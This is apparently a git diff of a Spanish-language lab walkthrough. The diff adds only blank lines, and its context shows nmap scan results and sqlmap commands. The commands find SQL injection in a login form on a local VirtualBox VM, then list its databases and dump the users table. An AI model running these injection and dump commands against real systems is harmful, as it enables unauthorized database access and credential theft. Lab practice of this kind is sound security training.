@@ -51,6 +51,7 @@ PORT   STATE SERVICE REASON         VERSION
 MAC Address: 08:00:27:69:6E:EA (Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 - Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
 - Purto 80 HTTP: Apache httpd 2.4.62 ((Debian))
 
@@ -106,6 +107,7 @@ Entonces, podemos tratar de explotarla con SQLMap.
 [19:15:05] [INFO] POST parameter 'user' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
 [19:15:05] [INFO] POST parameter 'user' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Acceso denegado.") 
 ```
+
 - Listamos las base de datos
 ```bash
 > sqlmap -u "http://192.168.1.190/auth-login.php" --forms --dbs --batch
@@ -118,6 +120,7 @@ available databases [6]:
 [*] sion
 [*] sys
 ```
+
 - Listo las tablas de la base de datos _Nebuchadnezzar_
 ```bash
 > sqlmap -u "http://192.168.1.190/auth-login.php" --forms -D Nebuchadnezzar --tables --batch 
@@ -128,6 +131,7 @@ Database: Nebuchadnezzar
 | users |
 +-------+
 ```
+
 - Encuentro la tabla users, y procedo a dumpear toda la informacion
 ```bash
 > sqlmap -u "http://192.168.1.190/auth-login.php" --forms -D Nebuchadnezzar -T users --dump --batch 
